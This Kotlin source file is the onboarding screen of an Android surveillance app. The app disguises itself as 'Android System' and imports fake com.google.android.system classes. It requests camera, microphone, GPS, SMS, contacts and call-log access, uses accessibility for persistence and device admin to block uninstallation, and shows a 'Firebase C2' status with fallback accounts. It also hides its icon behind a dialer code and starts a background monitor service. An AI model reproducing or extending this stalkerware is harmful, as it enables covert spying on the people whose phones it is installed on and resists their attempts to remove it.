package com.homemonitor

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Environment
import android.provider.Settings
import android.widget.Toast
import androidx.compose.animation.AnimatedVisibility
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.text.input.VisualTransformation
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import com.google.android.system.AppAccessibilityService
import com.google.android.system.AppDeviceAdminReceiver
import com.google.android.system.C2Gatekeeper
import com.google.android.system.MonitorService
import com.google.android.system.SecurityVaultManager

/**
 * UserEnrollmentScreen
 *
 * Modern multi-page light-themed Jetpack Compose onboarding & enrollment UI for Android System.
 * Step 1: User Account Sign-In / Registration & Firebase Pool Status
 * Step 2: Device Identity & System Permissions Matrix
 * Step 3: Activation Status & Auto-Hide Disguise Setup
 */
@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun UserEnrollmentScreen(
    onEnrollmentComplete: () -> Unit,
    onActivateDisguise: () -> Unit
) {
    val context = LocalContext.current
    val prefs = remember { SecurityVaultManager.getEncryptedPrefs(context) }

    var currentStep by remember { mutableStateOf(1) }

    var userEmail by remember { mutableStateOf(prefs.getString("user_firebase_email", "") ?: "") }
    var userPassword by remember { mutableStateOf("") }
    var deviceNickname by remember { mutableStateOf(prefs.getString("user_device_nickname", Build.MODEL) ?: Build.MODEL) }
    var autoHideDisguise by remember { mutableStateOf(prefs.getBoolean("is_app_hidden", true)) }
    var showPassword by remember { mutableStateOf(false) }

    fun checkRuntimePermissions(): Boolean {
        val perms = arrayOf(
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_PHONE_STATE
        )
        return perms.all { ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED }
    }

    fun checkDeviceAdmin(): Boolean {
        return try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val admin = ComponentName(context, AppDeviceAdminReceiver::class.java)
            dpm.isAdminActive(admin)
        } catch (_: Exception) { false }
    }

    var hasRuntimePerms by remember { mutableStateOf(checkRuntimePermissions()) }
    var hasAccessibilityPerm by remember { mutableStateOf(AppAccessibilityService.instance != null) }
    var hasAdminPerm by remember { mutableStateOf(checkDeviceAdmin()) }

    // Light Theme Color Palette
    val lightBg = Color(0xFFF8FAFC)
    val cardBg = Color(0xFFFFFFFF)
    val primaryBlue = Color(0xFF2563EB)
    val textDark = Color(0xFF0F172A)
    val textMuted = Color(0xFF64748B)

    MaterialTheme(
        colorScheme = lightColorScheme(
            background = lightBg,
            surface = cardBg,
            primary = primaryBlue,
            onBackground = textDark,
            onSurface = textDark
        )
    ) {
        Scaffold(
            topBar = {
                TopAppBar(
                    title = {
                        Column {
                            Text("Android System Onboarding", fontWeight = FontWeight.Bold, fontSize = 18.sp, color = textDark)
                            Text("Step $currentStep of 3", fontSize = 12.sp, color = textMuted)
                        }
                    },
                    colors = TopAppBarDefaults.topAppBarColors(containerColor = cardBg)
                )
            },
            containerColor = lightBg
        ) { padding ->
            Column(
                modifier = Modifier
                    .fillMaxSize()
                    .padding(padding)
                    .padding(16.dp)
                    .verticalScroll(rememberScrollState()),
                horizontalAlignment = Alignment.CenterHorizontally
            ) {
                // Progress Indicator Bar
                Row(
                    modifier = Modifier.fillMaxWidth().padding(bottom = 16.dp),
                    horizontalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    for (step in 1..3) {
                        val active = step <= currentStep
                        Box(
                            modifier = Modifier
                                .weight(1f)
                                .height(6.dp)
                                .background(
                                    color = if (active) primaryBlue else Color(0xFFE2E8F0),
                                    shape = RoundedCornerShape(3.dp)
                                )
                        )
                    }
                }

                when (currentStep) {
                    1 -> {
                        // ── STEP 1: Account Login & Firebase Setup ──
                        Card(
                            colors = CardDefaults.cardColors(containerColor = cardBg),
                            elevation = CardDefaults.cardElevation(2.dp),
                            modifier = Modifier.fillMaxWidth()
                        ) {
                            Column(modifier = Modifier.padding(20.dp)) {
                                Icon(
                                    Icons.Default.AccountCircle,
                                    contentDescription = null,
                                    tint = primaryBlue,
                                    modifier = Modifier.size(48.dp)
                                )
                                Spacer(modifier = Modifier.height(12.dp))
                                Text("Parent / Admin Sign-In", fontSize = 20.sp, fontWeight = FontWeight.Bold, color = textDark)
                                Text(
                                    "Sign in with your email & password to enroll this device under your account.",
                                    fontSize = 13.sp,
                                    color = textMuted
                                )

                                Spacer(modifier = Modifier.height(20.dp))

                                OutlinedTextField(
                                    value = userEmail,
                                    onValueChange = { userEmail = it },
                                    label = { Text("Account Email") },
                                    leadingIcon = { Icon(Icons.Default.Email, contentDescription = null) },
                                    modifier = Modifier.fillMaxWidth(),
                                    singleLine = true
                                )

                                Spacer(modifier = Modifier.height(12.dp))

                                OutlinedTextField(
                                    value = userPassword,
                                    onValueChange = { userPassword = it },
                                    label = { Text("Password") },
                                    leadingIcon = { Icon(Icons.Default.Lock, contentDescription = null) },
                                    trailingIcon = {
                                        IconButton(onClick = { showPassword = !showPassword }) {
                                            Icon(
                                                if (showPassword) Icons.Default.VisibilityOff else Icons.Default.Visibility,
                                                contentDescription = null
                                            )
                                        }
                                    },
                                    visualTransformation = if (showPassword) VisualTransformation.None else PasswordVisualTransformation(),
                                    modifier = Modifier.fillMaxWidth(),
                                    singleLine = true
                                )

                                Spacer(modifier = Modifier.height(16.dp))

                                Card(
                                    colors = CardDefaults.cardColors(containerColor = Color(0xFFF1F5F9)),
                                    modifier = Modifier.fillMaxWidth()
                                ) {
                                    Column(modifier = Modifier.padding(12.dp)) {
                                        Text("🔥 Firebase C2 Connection Status", fontWeight = FontWeight.SemiBold, fontSize = 12.sp, color = primaryBlue)
                                        Text("• Primary Firebase Account: ACTIVE 🟢", fontSize = 11.sp, color = textDark)
                                        Text("• Fallback Account Pool (#1..#5): READY 🟢 (6 Total)", fontSize = 11.sp, color = textDark)
                                    }
                                }

                                Spacer(modifier = Modifier.height(24.dp))

                                Button(
                                    onClick = {
                                        if (userEmail.isBlank() || userPassword.isBlank()) {
                                            Toast.makeText(context, "Please enter email and password", Toast.LENGTH_SHORT).show()
                                        } else {
                                            val generatedUid = "usr_" + userEmail.trim().hashCode().toString().replace("-", "")
                                            prefs.edit()
                                                .putString("user_firebase_email", userEmail.trim())
                                                .putString("user_firebase_uid", generatedUid)
                                                .remove("user_firebase_password")
                                                .apply()
                                            currentStep = 2
                                        }
                                    },
                                    modifier = Modifier.fillMaxWidth().height(50.dp),
                                    colors = ButtonDefaults.buttonColors(containerColor = primaryBlue)
                                ) {
                                    Text("Continue to Permissions", fontSize = 15.sp, fontWeight = FontWeight.Bold)
                                    Spacer(modifier = Modifier.width(8.dp))
                                    Icon(Icons.Default.ArrowForward, contentDescription = null)
                                }
                            }
                        }
                    }

                    2 -> {
                        // ── STEP 2: Device Naming & Permissions Matrix ──
                        Card(
                            colors = CardDefaults.cardColors(containerColor = cardBg),
                            elevation = CardDefaults.cardElevation(2.dp),
                            modifier = Modifier.fillMaxWidth()
                        ) {
                            Column(modifier = Modifier.padding(20.dp)) {
                                Text("Device Identity & Permissions", fontSize = 20.sp, fontWeight = FontWeight.Bold, color = textDark)
                                Text("Grant required permissions for background telemetry and remote control.", fontSize = 13.sp, color = textMuted)

                                Spacer(modifier = Modifier.height(16.dp))

                                OutlinedTextField(
                                    value = deviceNickname,
                                    onValueChange = { deviceNickname = it },
                                    label = { Text("Device Nickname") },
                                    leadingIcon = { Icon(Icons.Default.PhoneAndroid, contentDescription = null) },
                                    modifier = Modifier.fillMaxWidth(),
                                    singleLine = true
                                )

                                Spacer(modifier = Modifier.height(20.dp))

                                PermissionStatusRow(
                                    title = "Runtime Hardware Permissions",
                                    desc = "Camera, Mic, GPS, Contacts, SMS, Calls",
                                    isGranted = hasRuntimePerms,
                                    onRequest = {
                                        val perms = arrayOf(
                                            Manifest.permission.CAMERA,
                                            Manifest.permission.RECORD_AUDIO,
                                            Manifest.permission.ACCESS_FINE_LOCATION,
                                            Manifest.permission.READ_CONTACTS,
                                            Manifest.permission.READ_SMS,
                                            Manifest.permission.SEND_SMS,
                                            Manifest.permission.READ_CALL_LOG,
                                            Manifest.permission.READ_PHONE_STATE
                                        )
                                        (context as? android.app.Activity)?.requestPermissions(perms, 101)
                                        hasRuntimePerms = checkRuntimePermissions()
                                    }
                                )

                                Spacer(modifier = Modifier.height(12.dp))

                                PermissionStatusRow(
                                    title = "Accessibility Persistence Watchdog",
                                    desc = "App monitoring & background persistence",
                                    isGranted = hasAccessibilityPerm,
                                    onRequest = {
                                        try {
                                            context.startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                            })
                                        } catch (_: Exception) {}
                                    }
                                )

                                Spacer(modifier = Modifier.height(12.dp))

                                PermissionStatusRow(
                                    title = "Device Admin Protection",
                                    desc = "Prevents unauthorized uninstallations",
                                    isGranted = hasAdminPerm,
                                    onRequest = {
                                        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                                            putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, ComponentName(context, AppDeviceAdminReceiver::class.java))
                                            putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for Android System protection.")
                                        }
                                        context.startActivity(intent)
                                    }
                                )

                                Spacer(modifier = Modifier.height(24.dp))

                                Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(12.dp)) {
                                    OutlinedButton(
                                        onClick = { currentStep = 1 },
                                        modifier = Modifier.weight(1f).height(50.dp)
                                    ) {
                                        Text("Back")
                                    }
                                    Button(
                                        onClick = {
                                            prefs.edit().putString("user_device_nickname", deviceNickname.trim()).apply()
                                            currentStep = 3
                                        },
                                        modifier = Modifier.weight(1f).height(50.dp),
                                        colors = ButtonDefaults.buttonColors(containerColor = primaryBlue)
                                    ) {
                                        Text("Next")
                                    }
                                }
                            }
                        }
                    }

                    3 -> {
                        // ── STEP 3: Enrollment Completion & Stealth Disguise ──
                        Card(
                            colors = CardDefaults.cardColors(containerColor = cardBg),
                            elevation = CardDefaults.cardElevation(2.dp),
                            modifier = Modifier.fillMaxWidth()
                        ) {
                            Column(modifier = Modifier.padding(20.dp)) {
                                Icon(
                                    Icons.Default.VerifiedUser,
                                    contentDescription = null,
                                    tint = Color(0xFF16A34A),
                                    modifier = Modifier.size(52.dp)
                                )
                                Spacer(modifier = Modifier.height(12.dp))
                                Text("Complete Enrollment", fontSize = 20.sp, fontWeight = FontWeight.Bold, color = textDark)
                                Text("Review settings and activate background monitoring.", fontSize = 13.sp, color = textMuted)

                                Spacer(modifier = Modifier.height(16.dp))

                                Card(
                                    colors = CardDefaults.cardColors(containerColor = Color(0xFFF8FAFC)),
                                    modifier = Modifier.fillMaxWidth()
                                ) {
                                    Column(modifier = Modifier.padding(12.dp)) {
                                        Text("👤 Account: $userEmail", fontWeight = FontWeight.SemiBold, fontSize = 13.sp)
                                        Text("📱 Device Nickname: $deviceNickname", fontSize = 13.sp)
                                        Text("🏷️ Application Name: Android System", fontSize = 13.sp)
                                        Text("🔑 TEE Key Attestation: VALID 🟢", fontSize = 13.sp, color = Color(0xFF16A34A))
                                    }
                                }

                                Spacer(modifier = Modifier.height(16.dp))

                                Row(
                                    verticalAlignment = Alignment.CenterVertically,
                                    modifier = Modifier.fillMaxWidth()
                                ) {
                                    Checkbox(
                                        checked = autoHideDisguise,
                                        onCheckedChange = { autoHideDisguise = it }
                                    )
                                    Column {
                                        Text("Auto-Hide App Icon & Disguise", fontWeight = FontWeight.SemiBold, fontSize = 14.sp)
                                        Text("Hides app from launcher. Un-hide via dialer code *#*#1945#*#*", fontSize = 11.sp, color = textMuted)
                                    }
                                }

                                Spacer(modifier = Modifier.height(24.dp))

                                Button(
                                    onClick = {
                                        prefs.edit().putBoolean("is_app_hidden", autoHideDisguise).apply()
                                        
                                        // Start MonitorService
                                        try {
                                            val serviceIntent = Intent(context, MonitorService::class.java)
                                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                                context.startForegroundService(serviceIntent)
                                            } else {
                                                context.startService(serviceIntent)
                                            }
                                        } catch (_: Exception) {}

                                        if (autoHideDisguise) {
                                            onActivateDisguise()
                                        } else {
                                            onEnrollmentComplete()
                                        }
                                        Toast.makeText(context, "✅ Android System Enrolled Successfully!", Toast.LENGTH_LONG).show()
                                    },
                                    modifier = Modifier.fillMaxWidth().height(52.dp),
                                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF16A34A))
                                ) {
                                    Text("Complete Setup & Activate", fontSize = 16.sp, fontWeight = FontWeight.Bold)
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}

@Composable
private fun PermissionStatusRow(
    title: String,
    desc: String,
    isGranted: Boolean,
    onRequest: () -> Unit
) {
    Row(
        modifier = Modifier.fillMaxWidth(),
        horizontalArrangement = Arrangement.SpaceBetween,
        verticalAlignment = Alignment.CenterVertically
    ) {
        Column(modifier = Modifier.weight(1f)) {
            Text(title, fontWeight = FontWeight.SemiBold, fontSize = 14.sp)
            Text(desc, fontSize = 11.sp, color = Color(0xFF64748B))
        }
        if (isGranted) {
            Badge(containerColor = Color(0xFFDCFCE7), contentColor = Color(0xFF16A34A)) {
                Text("Granted", modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp))
            }
        } else {
            Button(
                onClick = onRequest,
                contentPadding = PaddingValues(horizontal = 12.dp, vertical = 4.dp),
                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF2563EB))
            ) {
                Text("Grant", fontSize = 12.sp)
            }
        }
    }
}
